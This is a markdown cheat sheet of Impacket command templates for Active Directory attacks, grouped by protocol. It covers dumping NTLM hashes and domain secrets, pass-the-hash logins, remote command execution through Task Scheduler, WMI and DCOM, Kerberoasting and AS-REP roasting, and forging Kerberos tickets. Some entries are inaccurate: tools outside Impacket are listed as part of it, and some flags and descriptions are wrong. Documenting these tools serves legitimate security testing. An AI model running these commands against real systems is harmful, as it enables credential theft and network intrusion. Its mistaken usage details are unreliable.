---
legal-banner: true
---

### **Impacket Toolkit**

Impacket is a collection of Python classes for working with network protocols. It is highly regarded in the cybersecurity community for its ability to handle low-level network tasks and its extensive support for various protocols, making it an essential toolkit for penetration testers and security researchers.

### **SMB/SMB2**

**smbclient.py** : Interactive SMB client to work with shares.

1. Access SMB shares interactively  
```bash
smbclient.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS]
```  
2. List all available shares on the target  
```bash
smbclient.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS] -L
```  

**secretsdump.py** : Dump secrets from a remote machine without executing any agent.

1. Dump NTLM hashes of all domain users from a domain controller  
```bash
secretsdump.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS]
```  

2. Dump NTLM hashes using Pass-the-Hash  
```bash
secretsdump.py -hashes [LMHASH]:[NTHASH] [DOMAIN]/[USERNAME]@[IP-ADDRESS]
```  

**netview.py** : Enumerate shares and sessions on the network.

1. Enumerate network shares and sessions  
```bash
netview.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS]
```  

2. Enumerate shares using Pass-the-Hash  
```bash
netview.py -hashes [LMHASH]:[NTHASH] [DOMAIN]/[USERNAME]@[IP-ADDRESS]
```  

### **MSRPC**

**rpcclient.py** : Execute client-side MSRPC calls. 

1. Execute MSRPC client calls  
```bash
rpcclient.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS]
```

2. Enumerate domain users  
```bash
rpcclient.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS] -c "enumdomusers"
```

3. Enumerate domain groups  
```bash
rpcclient.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS] -c "enumdomgroups"
```

4. Execute command on target machine  
```bash
rpcclient.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS] -c "cmd"
```  

**rpcdump.py** : Dump information about endpoints and interfaces.

1. Dump RPC endpoints and interfaces info  
```bash
rpcdump.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS]
```

2. Dump RPC endpoints using Pass-the-Hash  
```bash
rpcdump.py -hashes [LMHASH]:[NTHASH] [DOMAIN]/[USERNAME]@[IP-ADDRESS]
```

3. Dump RPC endpoints with no credentials  
```bash
rpcdump.py -no-pass [DOMAIN]/[USERNAME]@[IP-ADDRESS]
```  

### **DCE/RPC**

**atexec.py** : Execute commands using Task Scheduler.

1. Execute command using Task Scheduler  
```bash
atexec.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS] [COMMAND]
```

2. Execute command using Pass-the-Hash  
```bash
atexec.py -hashes [LMHASH]:[NTHASH] [DOMAIN]/[USERNAME]@[IP-ADDRESS] [COMMAND]
```

3. Execute command with no credentials  
```bash
atexec.py -no-pass [DOMAIN]/[USERNAME]@[IP-ADDRESS] [COMMAND]
```  

**wmiexec.py** : Execute commands via WMI.

1. Execute command via WMI  
```bash
wmiexec.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS] [COMMAND]
```

2. Execute command using Pass-the-Hash  
```bash
wmiexec.py -hashes [LMHASH]:[NTHASH] [DOMAIN]/[USERNAME]@[IP-ADDRESS] [COMMAND]
```

3. Execute command with no credentials  
```bash
wmiexec.py -no-pass [DOMAIN]/[USERNAME]@[IP-ADDRESS] [COMMAND]
```  

**dcomexec.py** : Execute commands using DCOM. 

1. Execute command using DCOM  
```bash
dcomexec.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS] [COMMAND]
```

2. Execute command using Pass-the-Hash  
```bash
dcomexec.py -hashes [LMHASH]:[NTHASH] [DOMAIN]/[USERNAME]@[IP-ADDRESS] [COMMAND]
```

3. Execute command with no credentials  
```bash
dcomexec.py -no-pass [DOMAIN]/[USERNAME]@[IP-ADDRESS] [COMMAND]
```  

### **LDAP**

#### **GetADUsers.py** : Enumerate all users in the domain.

1. Enumerate all domain users  
```bash
GetADUsers.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS]
```

2. Enumerate all users including disabled accounts  
```bash
GetADUsers.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS] -all
```

3. Use Pass-the-Hash for enumeration  
```bash
GetADUsers.py -hashes [LMHASH]:[NTHASH] [DOMAIN]/[USERNAME]@[IP-ADDRESS]
```  

#### **GetUserSPNs.py** : Enumerate Service Principal Names (SPNs).

1. Enumerate user SPNs  
```bash
GetUserSPNs.py [DOMAIN]/[USERNAME]:[PASSWORD] -dc-ip [IP-ADDRESS]
```

2. Request TGS for identified SPNs  
```bash
GetUserSPNs.py [DOMAIN]/[USERNAME]:[PASSWORD] -request -dc-ip [IP-ADDRESS]
```

3. Use Pass-the-Hash to enumerate SPNs  
```bash
GetUserSPNs.py -hashes [LMHASH]:[NTHASH] [DOMAIN]/[USERNAME] -dc-ip [IP-ADDRESS]
```  

#### **windapsearch.py** : Perform LDAP queries against Active Directory. 

1. Enumerate Group Policy Objects  
```bash
python3 windapsearch.py --dc-ip [IP-ADDRESS] -u [USERNAME]@[DOMAIN] -p [PASSWORD] --gpos
```

2. Enumerate objects with administrative privileges  
```bash
python3 windapsearch.py --dc-ip [IP-ADDRESS] -u [USERNAME]@[DOMAIN] -p [PASSWORD] --admin-objects
```

3. Enumerate users with SPNs  
```bash
python3 windapsearch.py --dc-ip [IP-ADDRESS] -u [USERNAME]@[DOMAIN] -p [PASSWORD] --user-spns
```

4. Enumerate users with unconstrained delegation  
```bash
python3 windapsearch.py --dc-ip [IP-ADDRESS] -u [USERNAME]@[DOMAIN] -p [PASSWORD] --unconstrained-users
```

5. Enumerate computers with unconstrained delegation  
```bash
python3 windapsearch.py --dc-ip [IP-ADDRESS] -u [USERNAME]@[DOMAIN] -p [PASSWORD] --unconstrained-computers
```  

### **Kerberos**

#### **ticketer.py** : Generate Kerberos tickets.

1. Generate a TGT ticket for a user  
```bash
ticketer.py -nthash [NTHASH] -domain-sid [SID] [USERNAME]
```

2. Generate a service ticket for a user and SPN  
```bash
ticketer.py -nthash [NTHASH] -domain-sid [SID] -request [USERNAME] [SPN]
```

3. Generate TGT ticket with AES encryption  
```bash
ticketer.py -aesKey [AESKEY] -domain-sid [SID] [USERNAME]
```  

**GetNPUsers.py** : Check for accounts with pre-authentication disabled.

1. Enumerate accounts with pre-auth disabled  
```bash
GetNPUsers.py [DOMAIN]/[USERNAME]:[PASSWORD] -dc-ip [IP-ADDRESS]
```

2. Request TGT for identified accounts  
```bash
GetNPUsers.py [DOMAIN]/[USERNAME]:[PASSWORD] -request -dc-ip [IP-ADDRESS]
```

3. Request TGT using Kerberos authentication  
```bash
GetNPUsers.py -k [DOMAIN]/[USERNAME] -request -dc-ip [IP-ADDRESS]
```  

### **NTLM**

**lookupsid.py** : Enumerate domain SID information.

1. Enumerate domain SID info  
```bash
lookupsid.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS]
```

2. Enumerate domain SID info using Pass-the-Hash  
```bash
lookupsid.py -hashes [LMHASH]:[NTHASH] [DOMAIN]/[USERNAME]@[IP-ADDRESS]
```

3. Enumerate domain SID info with no credentials  
```bash
lookupsid.py -no-pass [DOMAIN]/[USERNAME]@[IP-ADDRESS]
```  

**secretsdump.py** : Dump secrets from remote machines.

1. Dump secrets from a remote machine  
```bash
secretsdump.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS]
```

2. Dump secrets from the domain controller  
```bash
secretsdump.py -just-dc-user [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS]
```

3. Dump secrets using Pass-the-Hash  
```bash
secretsdump.py -hashes [LMHASH]:[NTHASH] [DOMAIN]/[USERNAME]@[IP-ADDRESS]
```  